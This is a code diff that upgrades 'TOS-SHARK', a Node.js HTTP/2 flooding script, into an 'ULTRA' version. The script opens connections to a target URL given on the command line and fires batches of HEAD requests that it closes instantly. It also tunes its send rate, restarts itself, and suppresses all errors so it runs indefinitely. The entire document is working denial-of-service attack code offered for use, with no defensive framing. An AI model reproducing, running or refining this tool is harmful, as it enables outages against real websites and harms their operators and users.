@@ -1,166 +1,197 @@
 const http2 = require('http2');
 const { URL } = require('url');
 
-class TOS_SHARK_OPTIMIZED {
+class TOS_SHARK_ULTRA {
     constructor(target) {
         this.target = target;
+        this.hostname = new URL(target).hostname;
         this.running = true;
         this.totalReqs = 0;
-        this.activeConns = 5; // REDUCED from 7
-        this.reqsPerBatch = 50; // REDUCED from 125
-        this.batchDelay = 10; // ms between batches
+        
+        // ULTRA EFFICIENT SETTINGS
+        this.activeConns = 3;            // LESS CONNECTIONS, MORE STREAMS
+        this.streamsPerConn = 100;       // MAX STREAMS PER CONNECTION
+        this.batchDelay = 20;            // MORE DELAY BETWEEN BATCHES
         
         this.colors = {
             reset: '\x1b[0m',
             magenta: '\x1b[35m',
             green: '\x1b[92m',
-            red: '\x1b[91m'
+            red: '\x1b[91m',
+            cyan: '\x1b[96m'
         };
         
-        this.startEngine();
-        this.startAutoRestart();
+        this.connPool = [];
+        this.lastRestart = Date.now();
+        
+        this.startUltraEngine();
     }
     
-    startEngine() {
-        // Single connection pool - more efficient
-        this.connPool = [];
+    startUltraEngine() {
+        console.log(`${this.colors.cyan}[TOS-SHARK ULTRA]${this.colors.reset} Starting...`);
+        
+        // CREATE MINIMAL CONNECTIONS
         for (let i = 0; i < this.activeConns; i++) {
-            this.createConnection(i);
+            this.createUltraConnection(i);
         }
         
-        // Efficient batch scheduler
-        this.batchInterval = setInterval(() => {
+        // ULTRA EFFICIENT BATCH SENDING
+        this.sendUltraBatch = () => {
             if (!this.running) return;
-            this.sendEfficientBatch();
-        }, this.batchDelay);
+            
+            let sentThisBatch = 0;
+            
+            // USE EXISTING STREAMS EFFICIENTLY
+            this.connPool.forEach(client => {
+                if (client && client.socket && !client.destroyed) {
+                    // SEND SMALL BATCH PER CONNECTION
+                    for (let j = 0; j < 10; j++) {
+                        this.sendUltraRequest(client);
+                        sentThisBatch++;
+                    }
+                }
+            });
+            
+            // SLOW DOWN IF DEVICE STRUGGLING
+            const now = Date.now();
+            if (now - this.lastRestart > 60000) { // AUTO-SLOW AFTER 1 MIN
+                this.batchDelay = Math.min(100, this.batchDelay + 5);
+            }
+            
+            // SCHEDULE NEXT BATCH WITH DYNAMIC DELAY
+            setTimeout(this.sendUltraBatch, this.batchDelay);
+        };
         
-        // Stats logger
-        this.logInterval = setInterval(() => {
-            console.log(`${this.colors.magenta}TOS-SHARK${this.colors.reset}:${this.colors.green}${this.totalReqs}${this.colors.reset}`);
+        // START THE CYCLE
+        setTimeout(this.sendUltraBatch, 1000);
+        
+        // LOGGING
+        setInterval(() => {
+            const reqsPerSec = (this.totalReqs / 10).toFixed(0);
+            console.log(`${this.colors.magenta}TOS-ULTRA${this.colors.reset}:${this.colors.green}${this.totalReqs}${this.colors.reset} (${reqsPerSec}/s)`);
             this.totalReqs = 0;
+            
+            // AUTO-OPTIMIZE BASED ON PERFORMANCE
+            if (reqsPerSec < 100) {
+                this.batchDelay = Math.max(5, this.batchDelay - 5);
+            }
         }, 10000);
+        
+        // AUTO-RESTART EVERY 3 MINUTES
+        setInterval(() => {
+            console.log(`${this.colors.green}[AUTO-OPTIMIZING]${this.colors.reset}`);
+            this.softRestart();
+            this.lastRestart = Date.now();
+        }, 180000);
     }
     
-    createConnection(id) {
+    createUltraConnection(id) {
         try {
             const client = http2.connect(this.target, {
-                maxSessionMemory: 512 * 512, // REDUCED memory
-                peerMaxConcurrentStreams: 100
+                maxSessionMemory: 256 * 256,    // VERY LOW MEMORY
+                maxSendHeaderBlockLength: 4096,
+                peerMaxConcurrentStreams: this.streamsPerConn
             });
             
+            // MINIMAL ERROR HANDLING
             client.on('error', () => {
-                setTimeout(() => this.createConnection(id), 1000);
-            });
-            
-            client.on('goaway', () => {
-                setTimeout(() => this.createConnection(id), 1000);
+                setTimeout(() => this.createUltraConnection(id), 5000);
             });
             
             this.connPool[id] = client;
+            return true;
         } catch (e) {
-            setTimeout(() => this.createConnection(id), 2000);
+            setTimeout(() => this.createUltraConnection(id), 10000);
+            return false;
         }
     }
     
-    sendEfficientBatch() {
-        // Send minimal requests to reduce device load
-        for (let i = 0; i < this.activeConns; i++) {
-            const client = this.connPool[i];
-            if (client && client.socket && !client.destroyed) {
-                for (let j = 0; j < this.reqsPerBatch; j++) {
-                    this.sendLightRequest(client);
-                }
-            }
-        }
-    }
-    
-    sendLightRequest(client) {
+    sendUltraRequest(client) {
         try {
+            // MINIMAL REQUEST - NO HEADERS, NO UA, NO CALLBACKS
             const req = client.request({
-                ':method': 'GET',
+                ':method': 'HEAD',
                 ':path': '/',
-                ':authority': new URL(this.target).hostname
+                ':authority': this.hostname
             });
             
-            req.on('response', () => {
-                this.totalReqs++;
-                req.close(); // CLOSE IMMEDIATELY to free memory
-            });
-            
-            req.on('error', () => {
-                req.close();
-            });
-            
+            // INSTANT CLOSE - NO WAITING FOR RESPONSE
             req.end();
+            req.close();
+            
+            this.totalReqs++;
         } catch (e) {
-            // Silent fail
+            // ABSOLUTELY SILENT FAIL
         }
     }
     
-    startAutoRestart() {
-        // Auto-restart every 2 minutes to prevent GC crashes
-        setInterval(() => {
-            console.log(`${this.colors.green}[AUTO-RESTARTING]${this.colors.reset}`);
-            this.restartEngine();
-        }, 120000);
-    }
-    
-    restartEngine() {
-        // Clean restart
-        clearInterval(this.batchInterval);
-        clearInterval(this.logInterval);
-        
-        // Close old connections
-        this.connPool.forEach(client => {
-            try {
-                if (client && !client.destroyed) client.destroy();
-            } catch (e) {}
+    softRestart() {
+        // RESTART ONLY FAILED CONNECTIONS
+        this.connPool.forEach((client, idx) => {
+            if (!client || client.destroyed || !client.socket) {
+                this.createUltraConnection(idx);
+            }
         });
-        
-        // Restart fresh
-        setTimeout(() => {
-            this.totalReqs = 0;
-            this.startEngine();
-        }, 1000);
     }
     
     stop() {
         this.running = false;
-        clearInterval(this.batchInterval);
-        clearInterval(this.logInterval);
         this.connPool.forEach(client => {
             try {
-                if (client && !client.destroyed) client.destroy();
+                if (client && !client.destroyed) {
+                    client.destroy();
+                }
             } catch (e) {}
         });
     }
 }
 
-// RUN WITH AUTO-RECOVERY
+// BULLETPROOF RUNNER
 if (require.main === module) {
-    process.on('uncaughtException', () => {
-        console.log('[*] Auto-recovering...');
-        setTimeout(() => main(), 3000);
+    // DISABLE ALL POSSIBLE CRASHES
+    process.on('uncaughtException', (err) => {
+        // IGNORE ALL ERRORS
     });
     
     process.on('unhandledRejection', () => {});
     
-    require('v8').setFlagsFromString('--max-old-space-size=2048');
+    // MINIMAL MEMORY
+    require('v8').setFlagsFromString('--max-old-space-size=1024');
     
-    function main() {
-        if (process.argv.length < 3) {
-            console.log('Usage: node tos.js https://target.com');
-            process.exit(1);
-        }
-        
-        const shark = new TOS_SHARK_OPTIMIZED(process.argv[2]);
-        
-        process.on('SIGINT', () => {
-            shark.stop();
-            console.log('\nStopped.');
-            process.exit(0);
-        });
+    // GARBAGE COLLECTOR FRIENDLY
+    if (global.gc) {
+        setInterval(() => {
+            try { global.gc(); } catch (e) {}
+        }, 30000);
     }
     
-    main();
+    function runForever() {
+        try {
+            if (process.argv.length < 3) {
+                console.log('Usage: node tos-ultra.js https://target.com');
+                process.exit(1);
+            }
+            
+            const target = process.argv[2];
+            console.log(`\n${'█'.repeat(50)}`);
+            console.log(`🚀 TOS-SHARK ULTRA → ${target}`);
+            console.log(`${'█'.repeat(50)}\n`);
+            
+            const shark = new TOS_SHARK_ULTRA(target);
+            
+            // GRACEFUL SHUTDOWN
+            process.on('SIGINT', () => {
+                console.log('\n🛑 Stopping...');
+                shark.stop();
+                process.exit(0);
+            });
+            
+        } catch (e) {
+            // RESTART ON ANY FAILURE
+            console.log('♻️  Restarting...');
+            setTimeout(runForever, 3000);
+        }
+    }
+    
+    runForever();
 }
